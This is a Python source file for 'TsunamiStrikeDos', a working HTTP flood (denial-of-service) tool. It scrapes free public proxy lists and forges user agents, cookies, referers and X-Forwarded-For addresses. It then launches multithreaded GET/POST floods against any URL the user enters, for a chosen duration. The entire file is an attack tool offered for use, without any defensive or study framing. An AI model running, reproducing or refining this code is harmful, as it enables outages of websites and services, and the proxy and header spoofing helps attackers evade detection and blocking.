import json
import random
import sys
import warnings
import string
import threading
import time
from typing import Dict, List
import requests
import faker
from colorama import Fore as F
from requests.exceptions import ConnectionError, Timeout
from fake_useragent import UserAgent
import os
from halo import Halo

os.system('clear')

version = "5.3 [ BETA ]"
method = "HTTP PROXY"

sip = Halo()
print(f'''
{F.WHITE} TSD TOOL {F.GREEN} |{F.WHITE} HTTP PROXY FLOOD {F.GREEN} |{F.WHITE} BY ALM7MDY
        {F.GREEN}
        ▄▄▄█████▓  ██████ ▓█████▄ 
        ▓  ██▒ ▓▒▒██    ▒ ▒██▀ ██▌
        ▒ ▓██░ ▒░░ ▓██▄   ░██   █▌
        ░ ▓██▓ ░   ▒   ██▒░▓█▄   ▌
        ▒██▒ ░ ▒██████▒▒░▒████▓ 
        ▒ ░░   ▒ ▒▓▒ ▒ ░ ▒▒▓  ▒ 
            ░    ░ ░▒  ░ ░ ░ ▒  ▒ 
        ░      ░  ░  ░   ░ ░  ░ 
                    ░     ░    
                        ░      

                {F.CYAN} TsunamiStrikeDos V{F.GREEN} {version}{F.RESET}

''')
print('_'*60)

fake = faker.Faker()

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

def generate_random_cookies() -> Dict[str, str]:
    """Generate random cookies."""
    cookie_count = random.randint(1, 5)  # عدد الكوكيز العشوائية
    cookies = {}
    for _ in range(cookie_count):
        key = ''.join(random.choices(string.ascii_letters, k=random.randint(3, 8)))
        value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15)))
        cookies[key] = value
    return cookies

def get_http_proxies() -> List[Dict[str, str]]:
    proxies = []
    try:
        with requests.get(
            "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=88270",
            verify=False,
        ) as proxy_list_http:
            proxies_http = [
                {"http": "http://" + proxy, "https": "http://" + proxy}
                for proxy in proxy_list_http.text.split("\r\n")
                if proxy != ""
            ]
            proxies.extend(proxies_http)

        with requests.get(
            "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=socks4&proxy_format=ipport&format=text&timeout=88270",
            verify=False,
        ) as proxy_list_socks4:
            proxies_socks4 = [
                {"http": "socks4://" + proxy, "https": "socks4://" + proxy}
                for proxy in proxy_list_socks4.text.split("\r\n")
                if proxy != ""
            ]
            proxies.extend(proxies_socks4)

    except Timeout:
        print(f"\n{F.RED}( !!! ) {F.CYAN}It was not possible to connect to the proxies!{F.RESET}")
        sys.exit(1)
    except ConnectionError:
        print(f"\n{F.RED}( !!! ) {F.CYAN}Device is not connected to the Internet!{F.RESET}")
        sys.exit(1)

    return proxies

proxies = get_http_proxies()

ua = UserAgent()

def generate_headers():
    cookies = generate_random_cookies()  # توليد ملفات تعريف الارتباط
    cookie_header = '; '.join([f"{key}={value}" for key, value in cookies.items()])  # تنسيق ملفات تعريف الارتباط
    return {
        "User-Agent": ua.random,
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": random.choice(["https://www.google.com", "https://www.bing.com", "https://www.yahoo.com"]),
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "X-Forwarded-For": fake.ipv4(),
        "Cookie": cookie_header  # إضافة ملفات تعريف الارتباط للرؤوس
    }

def buildBlock(size):

    block = ''.join(random.choice(string.ascii_letters) + random.choice(string.digits) for _ in range(size))
    return block
    return block

def generateRandData():
    return {
        "q": buildBlock(size=random.randint(5,10))+buildBlock(size=random.randint(5,10)),
    }

def flood(target: str) -> None:
    global proxies

    type_request = random.choice([
        "GET",
        "POST"
    ])

    headers = generate_headers()
    paramsGet = generateRandData()
    while True:
        try:
            proxy = random.choice(proxies)

            if type_request == "GET":
                response = requests.get(target, headers=headers, params=paramsGet ,proxies=proxy, timeout=5)
            else:
                response = requests.post(target, json=paramsGet,headers=headers,proxies=proxy, timeout=5)
            status = f"{F.GREEN if response.status_code == 200 else F.RED}({response.status_code}){F.RESET}"
            payload_size = f"{F.GREEN} Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
            proxy_addr = f"| {F.GREEN}Proxy: {F.CYAN}{proxy['http']:>21}"
            request_info = f"{F.CYAN}{type_request}{F.RESET}"
            print(f"{status}:{request_info} Successful Attack! --> {payload_size} {F.RESET}{proxy_addr}{F.RESET}")
        except (Timeout, OSError):
            continue

        if response.status_code != 200:
            try:
                proxies.remove(proxy)
            except ValueError:
                proxies = get_http_proxies()

def start_flooding(target: str, thread_count: int, duration: int) -> None:
    stop_time = time.time() + duration
    for _ in range(thread_count):
        thread = threading.Thread(target=flood, args=(target,))
        thread.daemon = True
        thread.start()

    while time.time() < stop_time:
        time.sleep(1)

    print(f"\n{F.CYAN}( Done ) {F.GREEN}Attack finished after {F.RED}{duration} seconds.{F.RESET}")

if __name__ == "__main__":
    target_url = input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Enter Url{F.CYAN})
└──╼ {F.YELLOW}~: {F.GREEN}''')
    num_threads = int(input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Threads{F.CYAN})
└──╼ {F.YELLOW}~: {F.GREEN}'''))
    duration = int(input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Time Attack{F.CYAN})
└──╼ {F.YELLOW}~: {F.GREEN}'''))

    print(f"""
- {F.RED} Attack on {F.GREEN}{target_url}{F.RED} for {F.GREEN}{duration}{F.RED} seconds using {F.GREEN}{num_threads}{F.RED} threads
""")
    sipp = Halo(text="Loding ...", spinner="dots")
    sipp.start()
    time.sleep(3)
    sipp.stop()
    start_flooding(target_url, num_threads, duration)